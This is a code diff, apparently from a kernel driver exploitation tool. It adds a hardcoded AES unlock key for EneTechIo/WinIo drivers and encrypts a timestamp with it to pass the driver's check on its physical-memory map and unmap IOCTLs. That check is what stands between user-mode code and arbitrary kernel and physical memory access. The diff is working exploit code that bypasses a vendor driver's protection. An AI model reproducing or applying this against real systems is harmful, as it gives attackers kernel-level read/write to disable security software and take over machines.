@@ -6,7 +6,7 @@
 *
 *  VERSION:     1.84
 *
-*  DATE:        12 Feb 2020
+*  DATE:        14 Feb 2020
 *
 *  MINIMUM SUPPORTED OS WINDOWS 7
 *
@@ -26,6 +26,14 @@
 #define VADDR_ADDRESS_MASK_4KB_PAGES    0x0000000000000fffull
 #define ENTRY_PRESENT_BIT               1
 #define ENTRY_PAGE_SIZE_BIT             0x0000000000000080ull
+
+#include "tinyaes/aes.h"
+
+//
+// AES key used by EneTechIo latest variants.
+//
+ULONG g_EneTechIoUnlockKey[4] = { 0x54454E45, 0x4E484345, 0x474F4C4F, 0x434E4959 };
+
 
 int PwEntryToPhyAddr(ULONG_PTR entry, ULONG_PTR* phyaddr)
 {
@@ -84,7 +92,6 @@ NTSTATUS PwVirtualToPhysical(
     return STATUS_SUCCESS;
 }
 
-
 /*
 * WinIoCallDriver
 *
@@ -131,16 +138,25 @@ NTSTATUS WinIoMapMemory(
     _Out_ PVOID* ReferencedObject,
     _Out_ PVOID* MappedMemory)
 {
+    ULONG seconds;
     NTSTATUS ntStatus;
-    WINIO_PHYSICAL_MEMORY_INFO request;
+    AES_ctx ctx;
+    WINIO_PHYSICAL_MEMORY_INFO_EX request;
 
-    *MappedMemory = NULL;
     *SectionHandle = NULL;
     *ReferencedObject = NULL;
 
+    RtlSecureZeroMemory(&ctx, sizeof(ctx));
+    AES_init_ctx(&ctx, (uint8_t*)&g_EneTechIoUnlockKey);
+
     RtlSecureZeroMemory(&request, sizeof(request));
-    request.ViewSize = NumberOfBytes;
+    request.CommitSize = NumberOfBytes;
     request.BusAddress = PhysicalAddress;
+
+    seconds = supGetTimeAsSecondsSince1970();
+
+    RtlCopyMemory(&request.EncryptedKey, (PVOID)&seconds, sizeof(seconds));
+    AES_ECB_encrypt(&ctx, (UCHAR*)&request.EncryptedKey);
 
     ntStatus = WinIoCallDriver(DeviceHandle,
         IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY,
@@ -173,12 +189,22 @@ NTSTATUS WinIoUnmapMemory(
     _In_ PVOID ReferencedObject
 )
 {
-    WINIO_PHYSICAL_MEMORY_INFO request;
+    ULONG seconds;
+    AES_ctx ctx;
+    WINIO_PHYSICAL_MEMORY_INFO_EX request;
+
+    RtlSecureZeroMemory(&ctx, sizeof(ctx));
+    AES_init_ctx(&ctx, (uint8_t*)&g_EneTechIoUnlockKey);
 
     RtlSecureZeroMemory(&request, sizeof(request));
     request.BaseAddress = SectionToUnmap;
     request.ReferencedObject = ReferencedObject;
     request.SectionHandle = SectionHandle;
+
+    seconds = supGetTimeAsSecondsSince1970();
+
+    RtlCopyMemory(&request.EncryptedKey, (PVOID)&seconds, sizeof(ULONG));
+    AES_ECB_encrypt(&ctx, (UCHAR*)&request.EncryptedKey);
 
     return WinIoCallDriver(DeviceHandle,
         IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY,
@@ -186,6 +212,7 @@ NTSTATUS WinIoUnmapMemory(
         sizeof(request),
         &request,
         sizeof(request));
+
 }
 
 /*
@@ -290,8 +317,6 @@ NTSTATUS WINAPI WinIoQueryPML4Value(
 
     return ntStatus;
 }
-
-
 
 /*
 * WinIoReadWritePhysicalMemory
@@ -432,7 +457,7 @@ NTSTATUS WINAPI WinIoVirtualToPhysical(
 */
 NTSTATUS WINAPI WinIoReadKernelVirtualMemory(
     _In_ HANDLE DeviceHandle,
-    _In_ ULONG_PTR Address,   
+    _In_ ULONG_PTR Address,
     _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
     _In_ ULONG NumberOfBytes)
 {
@@ -507,7 +532,7 @@ BOOL WinIoReadSystemMemoryEx(
 {
     IO_STATUS_BLOCK iost;
     NTSTATUS ntStatus;
-    
+
     ntStatus = WinIoReadKernelVirtualMemory(g_kdctx.DeviceHandle,
         Address,
         Buffer,
